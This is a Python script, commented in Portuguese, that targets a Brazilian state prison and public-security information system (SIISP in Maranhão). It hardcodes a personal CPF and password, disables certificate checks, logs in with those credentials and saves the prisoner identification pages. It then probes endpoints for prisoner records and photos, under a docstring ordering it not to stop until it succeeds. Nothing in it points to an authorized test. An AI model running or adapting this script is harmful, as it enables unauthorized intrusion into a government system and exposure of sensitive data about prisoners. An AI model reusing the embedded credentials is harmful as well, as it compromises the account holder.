#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SIISP Connector - Sistema Integrado de Informações de Segurança Pública
Target: https://siisp.ma.gov.br/SIISP/preso/identificacaoPessoa
Credenciais: 035.176.123-32:marlon89
Ordem: SÓ PARAR QUANDO CONSEGUIR
"""

import requests
import urllib3
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import re
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# CONFIG
BASE_URL = "https://siisp.ma.gov.br/SIISP"
REACT_URL = "https://siisp.ma.gov.br/siisp-react-2/public"
REACT_API = "https://siisp.ma.gov.br/siisp-react-2/api"
TARGET_URL = "https://siisp.ma.gov.br/SIISP/preso/identificacaoPessoa"
CPF = "035.176.123-32"
SENHA = "marlon89"

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
})

def print_section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")

def print_response(r, label=""):
    print(f"\n--- {label} ---")
    print(f"Status: {r.status_code}")
    print(f"URL: {r.url}")
    print(f"Content-Type: {r.headers.get('Content-Type', 'N/A')}")
    print(f"Content-Length: {len(r.text)}")
    print(f"Set-Cookie: {r.headers.get('Set-Cookie', 'N/A')}")
    print(f"Location: {r.headers.get('Location', 'N/A')}")

# ==================== FASE 1: RECONHECIMENTO ====================
print_section("FASE 1: RECONHECIMENTO - Acesso ao Sistema")

print(f"\n[*] Acessando URL alvo: {TARGET_URL}")
r1 = session.get(TARGET_URL, allow_redirects=True, timeout=30)
print_response(r1, "GET identificacaoPessoa")

# Verificar se há redirect para login
if "login" in r1.url.lower() or "auth" in r1.url.lower():
    print(f"\n[+] Detectado redirect para login: {r1.url}")

# Parsear HTML para encontrar form de login
soup = BeautifulSoup(r1.text, "html.parser")
forms = soup.find_all("form")
print(f"\n[*] Forms encontrados: {len(forms)}")

for i, form in enumerate(forms):
    action = form.get("action", "")
    method = form.get("method", "GET").upper()
    print(f"\n  Form {i}: action={action}, method={method}")
    inputs = form.find_all("input")
    for inp in inputs:
        name = inp.get("name", "")
        type_ = inp.get("type", "text")
        print(f"    input[{type_}] name={name}")

# ==================== FASE 2: LOGIN ====================
print_section("FASE 2: TENTATIVA DE LOGIN")

# Procurar URL de login
login_url = None
for form in forms:
    action = form.get("action", "")
    if action:
        login_url = urljoin(BASE_URL, action)
        break

if not login_url:
    # Tentar URL comum de login
    login_url = f"{BASE_URL}/j_spring_security_check"
    print(f"\n[*] Tentando URL de login Spring Security: {login_url}")
else:
    print(f"\n[+] URL de login detectada: {login_url}")

# Tentar login com credenciais
login_data = {
    "j_username": CPF,
    "j_password": SENHA,
}

print(f"\n[*] Enviando credenciais: {CPF}:{SENHA}")
r2 = session.post(login_url, data=login_data, allow_redirects=True, timeout=30)
print_response(r2, "POST login")

# Verificar se login foi bem-sucedido
if r2.status_code == 200:
    if "login" not in r2.url.lower() and "error" not in r2.url.lower():
        print(f"\n[+] LOGIN BEM-SUCEDIDO! URL final: {r2.url}")
    else:
        print(f"\n[-] Login pode ter falhado. URL final: {r2.url}")
        # Verificar mensagem de erro
        if "erro" in r2.text.lower() or "inválido" in r2.text.lower() or "invalid" in r2.text.lower():
            print(f"\n[-] Mensagem de erro detectada no HTML")

# ==================== FASE 3: ACESSAR PÁGINA ALVO ====================
print_section("FASE 3: ACESSAR PÁGINA DE IDENTIFICAÇÃO")

print(f"\n[*] Tentando acessar: {TARGET_URL}")
r3 = session.get(TARGET_URL, allow_redirects=True, timeout=30)
print_response(r3, "GET identificacaoPessoa (pós-login)")

# Verificar conteúdo
if "identificacaoPessoa" in r3.text or "identificacao" in r3.text.lower():
    print(f"\n[+] Página de identificação acessada!")
    
    # Parsear para encontrar dados
    soup3 = BeautifulSoup(r3.text, "html.parser")
    
    # Buscar tabelas
    tables = soup3.find_all("table")
    print(f"\n[*] Tabelas encontradas: {len(tables)}")
    
    # Buscar campos de formulário
    forms3 = soup3.find_all("form")
    print(f"\n[*] Forms na página: {len(forms3)}")
    
    # Buscar campos de input
    inputs = soup3.find_all("input")
    print(f"\n[*] Inputs: {len(inputs)}")
    
    # Buscar dados de pessoa
    dados = {}
    for inp in inputs:
        name = inp.get("name", "")
        value = inp.get("value", "")
        if name and value:
            dados[name] = value
            print(f"  {name}: {value}")
    
    # Buscar campos de select
    selects = soup3.find_all("select")
    print(f"\n[*] Selects: {len(selects)}")
    
    # Buscar campos de textarea
    textareas = soup3.find_all("textarea")
    print(f"\n[*] Textareas: {len(textareas)}")
    
    # Extrair todo o texto
    print(f"\n[*] Título da página: {soup3.find('title').text if soup3.find('title') else 'N/A'}")
    
    # Salvar resposta para análise
    with open("siisp_response.html", "w", encoding="utf-8") as f:
        f.write(r3.text)
    print(f"\n[+] HTML salvo em: siisp_response.html")

else:
    print(f"\n[-] Página de identificação não acessada. URL: {r3.url}")
    print(f"\n[*] HTML salvo para debug")
    with open("siisp_response.html", "w", encoding="utf-8") as f:
        f.write(r3.text)

# ==================== FASE 4: EXPLORAR ENDPOINTS ====================
print_section("FASE 4: EXPLORAR ENDPOINTS DO SIISP")

endpoints = [
    "/preso/identificacaoPessoa",
    "/preso/dadosPessoa",
    "/preso/foto",
    "/preso/lista",
    "/preso/buscar",
    "/api/pessoa",
    "/api/presos",
    "/api/identificacao",
    "/preso/foto3x4",
    "/preso/dadosBasicos",
]

for ep in endpoints:
    url = f"{BASE_URL}{ep}"
    try:
        r = session.get(url, allow_redirects=True, timeout=15)
        status = "✓" if r.status_code == 200 else "✗"
        size = len(r.text)
        print(f"  {status} {ep} -> {r.status_code} ({size} bytes)")
        
        if r.status_code == 200 and size > 100:
            # Salvar para análise
            with open(f"siisp_{ep.replace('/', '_').replace(':', '_')}.html", "w", encoding="utf-8") as f:
                f.write(r.text)
                
    except Exception as e:
        print(f"  ✗ {ep} -> ERRO: {str(e)[:50]}")

print(f"\n{'='*60}")
print(f"  CONEXÃO FINALIZADA")
print(f"{'='*60}")
